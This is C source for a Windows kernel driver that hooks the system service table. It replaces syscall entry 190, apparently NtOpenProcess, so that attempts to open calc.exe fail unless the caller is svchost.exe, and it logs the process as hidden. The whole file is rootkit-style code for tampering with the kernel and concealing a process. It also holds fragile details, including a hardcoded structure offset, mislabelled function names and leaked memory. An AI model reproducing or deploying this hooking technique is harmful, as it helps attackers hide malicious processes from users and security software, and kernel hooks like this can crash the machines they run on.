#include <ntifs.h>
#include <ntddk.h>
#include <string.h>

#define DeviceName L"\\Device\\hook"
#define LnkDeviceName L"\\DosDevices\\hook" 


#pragma pack(1)
typedef struct ServiceDescriptorEntry {
        unsigned int *ServiceTableBase;
        unsigned int *ServiceCounterTableBase; 
        unsigned int NumberOfServices;
        unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()
__declspec(dllimport)  ServiceDescriptorTableEntry_t KeServiceDescriptorTable;

PMDL  g_pmdlSystemCall;
PVOID *MappedSystemCallTable;
int IsHooked;

typedef struct ProcessInformation{
	ULONG pid;
	ULONG ppid;
	UCHAR *name;
	PUNICODE_STRING pathname;
} ProcessInformation;

NTSYSAPI
NTSTATUS
NTAPI ZwQueryInformationProcess(
  __in       HANDLE ProcessHandle,
  __in       PROCESSINFOCLASS ProcessInformationClass,
  __out      PVOID ProcessInformation,
  __in       ULONG ProcessInformationLength,
  __out_opt  PULONG ReturnLength
);

NTSYSAPI
NTSTATUS
NTAPI NtCreateFile(
);

typedef NTSTATUS (*NTOPENPROCESS)(
PHANDLE            ProcessHandle,
ACCESS_MASK        DesiredAccess,
POBJECT_ATTRIBUTES ObjectAttributes,
PCLIENT_ID         ClientId
	
);


NTOPENPROCESS OldNtCreateFile;


NTSTATUS  NewNtCreateFile(
PHANDLE            ProcessHandle,
ACCESS_MASK        DesiredAccess,
POBJECT_ATTRIBUTES ObjectAttributes,
PCLIENT_ID         ClientId
)
{
	NTSTATUS status;
	PEPROCESS pEproc;
	NTSTATUS info;
	char * name;
	char * hide_proc = "calc.exe";
	UNICODE_STRING unicode_hp;
	int offset_name = 0x16c;
	ULONG size;
	PVOID procInfo;

	RtlInitUnicodeString(&unicode_hp, L"\\Device\\HarddiskVolume2\\Windows\\System32\\calc.exe");

	status = (NTSTATUS) (*OldNtCreateFile)(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);

	info = ZwQueryInformationProcess(*ProcessHandle,27,NULL,0,&size);

	if (info == STATUS_INFO_LENGTH_MISMATCH)
	{
		procInfo = ExAllocatePool(NonPagedPool, size);
		if(procInfo == NULL)
		{
			DbgPrint("Error: ExAllocatePool\n");
			return STATUS_UNSUCCESSFUL;
		}
		else{
			info = ZwQueryInformationProcess(*ProcessHandle,27,procInfo,size,NULL);
			if(NT_SUCCESS(info))
			{
				//DbgPrint("Process name: %wZ\n", procInfo);
				//DbgPrint("Process name: %s\n", (char*)procInfo);
				if(RtlCompareUnicodeString(&unicode_hp,procInfo,TRUE) == 0)
				{
					//DbgPrint("find process %s\n", hide_proc);
					pEproc = IoGetCurrentProcess();
					name = (PUCHAR) pEproc + offset_name;

					if(strcmp(name,"svchost.exe") == 0)
					{
						DbgPrint("Process %s is hidden\n", hide_proc);
						return status;
					}
					else{
						//DbgPrint("Process %s is not open\n", hide_proc);
						return STATUS_UNSUCCESSFUL;
					}
					
				}
			}
			ExFreePool(procInfo);
		}

	}

	return status;

}







NTSTATUS Hook_Function()
{
	g_pmdlSystemCall=IoAllocateMdl(KeServiceDescriptorTable.ServiceTableBase, KeServiceDescriptorTable.NumberOfServices*4, 0, 0, NULL);

   	if(!g_pmdlSystemCall)
      	return STATUS_UNSUCCESSFUL;

   	MmBuildMdlForNonPagedPool(g_pmdlSystemCall);
	
	MappedSystemCallTable=MmMapLockedPages(g_pmdlSystemCall, KernelMode);

	__try{
		OldNtCreateFile = (PVOID) InterlockedExchange( (PLONG) &MappedSystemCallTable[190], (LONG) NewNtCreateFile);
		IsHooked = 1;
	}
	__except(1){
			DbgPrint("DriverEntry: Hook failed");

	}
	return STATUS_SUCCESS;
}
 
void Unhook_fonction()
{	
	__try
	{
		InterlockedExchange( (PLONG) &MappedSystemCallTable[190], (LONG) OldNtCreateFile);
		IsHooked = 0;
	}
	__except(1){
			DbgPrint("DriverEntry: Unhook failed");
	}
 
    // Unlock and Free MDL
	if(g_pmdlSystemCall)
	{
		MmUnmapLockedPages(MappedSystemCallTable, g_pmdlSystemCall);
		IoFreeMdl(g_pmdlSystemCall);
	}
	DbgPrint("Unhook Function \n");
}
 

NTSTATUS DriverDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
  	Irp->IoStatus.Status=STATUS_SUCCESS;
  	IoCompleteRequest(Irp,IO_NO_INCREMENT);
  	return Irp->IoStatus.Status;
	}

NTSTATUS DriverCreate(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	
  	Irp->IoStatus.Status=STATUS_SUCCESS;
  	IoCompleteRequest(Irp,IO_NO_INCREMENT);
  	return Irp->IoStatus.Status;
}


NTSTATUS DriverUnload(IN PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING usLnkName;
	RtlInitUnicodeString(&usLnkName,LnkDeviceName);
    IoDeleteSymbolicLink(&usLnkName);
	if(IsHooked)
		Unhook_fonction();

    IoDeleteDevice(DriverObject->DeviceObject);
	DbgPrint("Bye !!\n");
	return STATUS_SUCCESS;
}




NTSTATUS DriverEntry(PDRIVER_OBJECT  pDriverObject, PUNICODE_STRING  pRegistryPath)
{
	ULONG i,NtStatus;
	PDEVICE_OBJECT pDeviceObject=NULL;
	UNICODE_STRING usDriverName,usLnkName;

	DbgPrint("Hello from KernelLand master\n");
	
	for(i=0;i<IRP_MJ_MAXIMUM_FUNCTION;i++)
	pDriverObject->MajorFunction[i]=DriverDispatch;

	pDriverObject->MajorFunction[IRP_MJ_CREATE]=DriverCreate; 
	
	RtlInitUnicodeString(&usDriverName,DeviceName);
	RtlInitUnicodeString(&usLnkName,LnkDeviceName);
	
	NtStatus=IoCreateDevice(pDriverObject,
							0, 
	 						&usDriverName, 
	 						FILE_DEVICE_UNKNOWN, 
	 						FILE_DEVICE_SECURE_OPEN, 
	 						FALSE, 
	 						&pDeviceObject);
	if(NtStatus!=STATUS_SUCCESS)
		DbgPrint("Error with IoCreateDevice()");

	
	NtStatus=IoCreateSymbolicLink(&usLnkName,&usDriverName);
		if(NtStatus!=STATUS_SUCCESS)
		DbgPrint("Error with IoCreateSymbolicLink()");
	
	pDriverObject->DriverUnload=DriverUnload;

	Hook_Function();

	return STATUS_SUCCESS;	
}

